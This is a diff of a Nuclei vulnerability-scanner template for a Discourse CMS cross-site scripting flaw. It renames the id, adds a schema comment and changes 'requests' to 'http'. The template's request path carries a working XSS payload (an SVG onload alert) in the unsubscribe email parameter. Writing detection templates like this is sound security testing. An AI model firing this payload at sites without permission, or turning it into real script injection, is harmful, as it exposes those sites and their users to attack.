@@ -1,9 +1,10 @@
-id: Discourse XSS
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: Discourse-XSS
 info:
   name: Discourse CMS XSS
   author: madrobot
   severity: medium
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\"><svg/onload=alert(1337)>'
